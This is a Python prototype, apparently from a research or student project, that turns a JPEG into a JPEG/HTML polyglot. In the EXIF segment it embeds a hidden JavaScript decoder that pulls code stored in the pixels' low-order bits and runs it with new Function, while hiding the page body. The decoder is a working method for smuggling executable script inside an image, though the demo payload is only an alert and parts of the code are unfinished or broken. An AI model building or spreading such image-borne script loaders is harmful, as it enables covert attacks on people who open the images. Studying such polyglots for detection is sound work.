'''
jpg.py
<alexmichael@uchicago.edu>

Description: Prototype of polyglot generator.

TODO:
	- [ ] Build the least significant bit layer injector
'''


import struct
import re
import random


class Polyglot:
	def __init__(self):
		self.infile = open('stego.jpg','rb')
		self.outfile = open('out3.html','wb')

	def genRandomHTMLChar():
		while True:
			x = random.randint(0,255)
			if x != 0 and x!=ord('<') and x!=ord('>') and x!=ord('/'):
				return x


	def create(self, debug=True):
		infile = self.infile
		outfile = self.outfile

		scanning = False

		prevByte = infile.read(2)
		outfile.write(prevByte)

		while True:
			curByte = infile.read(1)
			if not curByte:
				break

			# Write the 
			if 0xff in prevByte and curByte[0] in range(0xe0,0xe9):
				outfile.write(curByte)
				exifLen = struct.unpack('>H',infile.read(2))[0]-2	# convert exif length
				outfile.write(struct.pack('>H', 0x2f2a))	# set the exif header to 0
				exifData = infile.read(exifLen)				# write the exif header to the file
				outfile.write(exifData)

				decoder=b"""<head><script>var bL=2,eC=3,gr=3;function i0(){px.onclick=dID}function dID(){alert('hi');var b=document.createElement("canvas");px.parentNode.insertBefore(b,px);b.width=px.width;b.height=px.height;var m=b.getContext("2d");m.drawImage(px,0,0);px.parentNode.removeChild(px);var f=m.getImageData(0,0,b.width,b.height).data;var h=[],j=0,g=0;var c=function(p,o,u){n=(u*b.width+o)*4;var z=1<<bL;var s=(p[n]&z)>>bL;var q=(p[n+1]&z)>>bL;var a=(p[n+2]&z)>>bL;var t=Math.round((s+q+a)/3);switch(eC){case 0:t=s;break;case 1:t=q;break;case 2:t=a;break;}return(String.fromCharCode(t+48))};var k=function(a){for(var q=0,o=0;o<a*8;o++){h[q++]=c(f,j,g);j+=gr;if(j>=b.width){j=0;g+=gr}}};k(6);var d=parseInt(bTS(h.join("")));k(d);try{CollectGarbage()}catch(e){}exc(bTS(h.join("")))}function bTS(b){var a="";for(i=0;i<b.length;i+=8)a+=String.fromCharCode(parseInt(b.substr(i,8),2));return(a)}function exc(b){var a=setTimeout((new Function(b)),100)}window.onload=i0;</script><style>body{visibility:hidden;} .s{visibility:visible;position:absolute;top:15px;left:10px;}</style></head><body><div class=s><img id=px src="#"></div></body></html>"""
				# decoder=b"""<head><style>body{visibility:hidden;} .s{visibility:visible;position:absolute;top:15px;left:10px;}</style></head><body><div class=s><img id=px src="#"><script>window.onload=()=>{px.onclick=()=>{alert('hello')}}</script></div></body></html>"""
				html = b'<html><!--'
				content = b'-->'+decoder+b'<!--'
				paddingLen = 0x2f2a - len(content) - len(html) - exifLen - 2
				randomLength = random.randint(0,paddingLen)
				padding = b''
				for i in range(paddingLen):
					x = Polyglot.genRandomHTMLChar()
					padding += bytes([x])

				prePadding = padding[0:randomLength]
				postPadding = padding[randomLength:]

				finalContent = html + prePadding + content + postPadding
				outfile.write(finalContent)				# write payload into the exif
				curByte = infile.read(1)

				if debug:
					print('Write out exif data','\n')
				

			# Define Quantization Table(s) 
			elif 0xff in prevByte and 0xdb in curByte:
				outfile.write(curByte)
				dqtLen = struct.unpack('>H',infile.read(2))[0]-2
				data = infile.read(dqtLen)
				outfile.write(struct.pack('>H',dqtLen+2))
				outfile.write(data)
				
				if debug:
					print('Define Quantization Tables')
					print(data,'\n')

				curByte = infile.read(1)

			# Frame Header:
			#
			# Indicates that this is a baseline DCT-based JPEG, and 
			# specifies the width, height, number of components, and 
			# component subsampling (e.g., 4:2:0) 
			elif 0xff in prevByte and 0xc0 in curByte:
				outfile.write(curByte)
				frameHeaderLen = struct.unpack('>H',infile.read(2))[0]-2
				data = infile.read(frameHeaderLen)
				outfile.write(struct.pack('>H',frameHeaderLen+2))
				outfile.write(data)
				if debug:
					print('Frame header')
					print(data,'\n')
					# http://lad.dsc.ufcg.edu.br/multimidia/jpegmarker.pdf
				curByte = infile.read(1)

			# Frame Header:
			#
			# Indicates that this is a progressive DCT-based JPEG, and 
			# specifies the width, height, number of components, and 
			# component subsampling (e.g., 4:2:0). 
			elif 0xff in prevByte and 0xc2 in curByte:
				outfile.write(curByte)
				frameHeaderLen = struct.unpack('>H',infile.read(2))[0]-2
				data = infile.read(frameHeaderLen)
				outfile.write(struct.pack('>H',frameHeaderLen+2))
				outfile.write(data)
				if debug:
					print('Frame header')
					print(data,'\n')
				curByte = infile.read(1)

			# Start Huffman tables
			elif 0xff in prevByte and 0xc4 in curByte:
				outfile.write(curByte)
				huffmanTableLen = struct.unpack('>H',infile.read(2))[0]-2
				data = infile.read(huffmanTableLen)
				
				outfile.write(struct.pack('>H',huffmanTableLen+2))
				outfile.write(data)
				if debug:
					print('Start Huffman table')
					print(data,'\n')
				curByte = infile.read(1)

			# Start of scan (SOS)
			elif 0xff in prevByte and 0xda in curByte:
				outfile.write(curByte)
				sosLen = struct.unpack('>H',infile.read(2))[0]-2
				data = infile.read(sosLen)

				outfile.write(struct.pack('>H',sosLen+2))
				outfile.write(data)
				if debug:
					print('Start of scan (SOS)')
					print(data,'\n')
				scanning=True
				curByte = infile.read(1)


			# NOTE: Scanning image data
			elif scanning:
				print(curByte)
				pass

			# End of frame marker
			elif 0xff in prevByte and 0xd9 in curByte:
				print(prevByte, curByte)
				print('end')

			else:
				pass

			outfile.write(curByte)
			prevByte = curByte

		# end all content
		outfile.write(b'\x2a\x2f -->')
		
		outfile.close()
		infile.close()

	def bits(debug=True):
		infile = open('out2.jpg','rb')

		prevByte = infile.read(1)
		while True:
			curByte = infile.read(1)
			if not curByte:
				break

			# Start of scan (SOS)
			if 0xff in prevByte and 0xda in curByte:
				sosLen = struct.unpack('>H',infile.read(2))[0]
				data = infile.read(sosLen-2)
				if debug:
					print('Start of scan (SOS)')
					print(data,'\n')
				infile.seek(-2,1)
				break

		while True:

			# NOTE: The actual image data is between the SOS and 
			# the end of frame marker


			# End of frame marker
			if 0xff in prevByte and 0xd9 in curByte:
				print(prevByte, curByte)
				print('end')

			prevByte = curByte

		infile.close()





def test():
	var= b'\xff\xd9'
	if 0xff in var:
		print(var)

def read(fname='out2.jpg'):
	file = open(fname, 'rb')
	while True:
		data = file.read(16)
		if not data:
			break
		print(data)

def main():
	Polyglot().create()
	# Polyglot.bits()

if __name__ == '__main__':
	main()
	# read()
	# test()